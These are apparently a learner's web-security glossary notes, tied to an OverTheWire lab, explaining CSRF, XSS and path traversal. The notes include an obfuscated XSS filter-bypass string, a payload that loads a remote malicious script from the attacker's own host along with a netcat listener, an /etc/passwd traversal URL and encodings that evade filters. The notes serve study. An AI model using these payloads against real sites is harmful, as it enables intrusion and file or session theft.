# Terminology

## Cross Site Request Forgery (CSRF)

A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user.

CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.

CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.

## Cross Site Scripting (XSS)

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. Flaws that allow these attacks to succeed occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

* [XSS Filter Bypass Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
  * If no quotes of any kind are allowed you can use `eval()` and `fromCharCode()`. e.g.:<br/>
  `eval(String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,34,88,83,83,34,41));`<br/>
  which is equivalent to <br/>
  `javascript:alert("XSS");`
* [XSS Prevention techniques](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) for the developer

### How to inject a payload?

1. Make the web server load a script from you. In other words, the XSS attack should inject the following (or similar) payload

    ```js
    document.write('script src="http://<your-ip>/malicious.js"</script>');
    ```

    In order to check if the web server even attempts to load your script, you can always run a netcat first with `-lvnp 80`.<br/>
    This method has the benefit that you need no further anti-sanitization for your actual malicious payloads. Anti-sanitization is required only to enter the above javascript code.

## Path Traversal

The Path Traversal attack technique allows an attacker access to files, directories, and commands that potentially reside outside the web document root directory. An attacker may manipulate a URL in such a way that the web site will execute or reveal the contents of arbitrary files anywhere on the web server. Any device that exposes an HTTP-based interface is potentially vulnerable to Path Traversal.

e.g. `https://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd`

Most web sites restrict user access to a specific portion of the file-system, typically called the "web document root" or "CGI root" directory. These directories contain the files intended for user access and the executable necessary to drive web application functionality. To access files or execute commands anywhere on the file-system, Path Traversal attacks will utilize the ability of special-characters sequences.

The most basic Path Traversal attack uses the `../` special-character sequence to alter the resource location requested in the URL. Although most popular web servers will prevent this technique from escaping the web document root, alternate encodings of the `../` sequence may help bypass the security filters. These method variations include valid and invalid Unicode-encoding (`..%u2216` or `..%c0%af`) of the forward slash character, backslash characters (`..\`) on Windows-based servers, URL encoded characters `%2e%2e%2f`), and double URL encoding (`..%255c`) of the backslash character.

Even if the web server properly restricts Path Traversal attempts in the URL path, a web application itself may still be vulnerable due to improper handling of user-supplied input. This is a common problem of web applications that use template mechanisms or <u>load static text from files</u>. 

In variations of the attack, the original URL parameter value is substituted with the file name of one of the web application's dynamic scripts. Consequently, the results can reveal source code because the file is interpreted as text instead of an executable script. These techniques often employ additional special characters such as the dot (`.`) to reveal the listing of the current working directory, or `%00` NULL characters in order to bypass rudimentary file extension checks.
